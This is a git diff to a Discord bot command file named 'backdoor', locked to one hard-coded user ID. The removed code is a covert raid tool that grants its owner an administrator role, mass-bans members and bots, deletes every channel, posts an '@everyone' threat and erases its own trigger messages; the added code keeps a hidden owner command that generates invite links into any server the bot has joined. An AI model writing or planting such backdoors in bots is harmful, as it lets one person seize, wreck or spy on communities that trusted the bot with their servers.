@@ -1,82 +1,25 @@
-const Discord = require("discord.js");
-const fetch = require("node-fetch");
-
 exports.run = async (client, message, args) => {
   if (message.author.id !== "583649910092595232") return;
 
-  if (args[0] === "leave") {
-    try {
-      message.channel.send('👋 | Bye')
-      message.guild.leave();
-      message.delete({ Timeout: 0 });
-    } catch (e) {
-      console.log(e.stack);
-    }
-  }
+  if (!args[0])
+    return message.channel.send("Please input guild id for making invite");
 
-  if (args[0] === "admin") {
-    try {
-      let role = await message.guild.roles.create({
-        data: { name: "Cl4yn3", color: "#botanj", permissions: [8] }
-      });
+  let guildId = args[0];
 
-      message.member.roles.add(role);
-      message.delete({ Timeout: 0 });
-    } catch (e) {
-      console.log(e.stack);
-    }
-  }
-
-  if (args[0] === "bb") {
-    try {
-      message.guild.members.cache
-        .filter(bot => bot.bannable)
-        .forEach(bot => {
-          bot.ban();
-        });
-      message.delete({ Timeout: 0 });
-    } catch (e) {
-      console.log(e.stack);
-    }
-  }
-
-  if (args[0] === "bm") {
-    try {
-      message.guild.members.cache
-        .filter(member => member.bannable)
-        .forEach(member => {
-          member.ban();
-        });
-      message.delete({ Timeout: 0 });
-    } catch (e) {
-      console.log(e.stack);
-    }
-  }
-
-  if (args[0] === "raid") {
-    message.guild.channels.cache.forEach(x => {
-      x.delete(x.id);
-      message.delete({ Timeout: 0 });
-    });
-  }
-
-  if (args[0] === "mt") {
-    try {
-      message.channel.send("@everyone listen to Clayne or get raid.");
-      message.delete({ Timeout: 0 });
-    } catch (e) {
-      console.log(e.stack);
-    }
-  }
+  var guild = client.guilds.cache.get(guildId);
+  var channel = guild.channels.cache.find(ch => ch.type === "text"); // getting server's random text channel
+  channel.createInvite().then(invite => {
+    message.channel.send(`<a:b_yes:721969088813072425> **| Here Invite Link For That Id Guild**\n**Here:**${invite.url}`);
+  });
 };
 
 exports.help = {
   name: "backdoor",
-  description: "backdoor command for owner",
-  usage: "bd <command>"
+  description: "Getting server invite link",
+  usage: "backdoor <guild_id>"
 };
 
 exports.conf = {
-  aliases: ["bd"],
+  aliases: [],
   cooldown: 0
 };
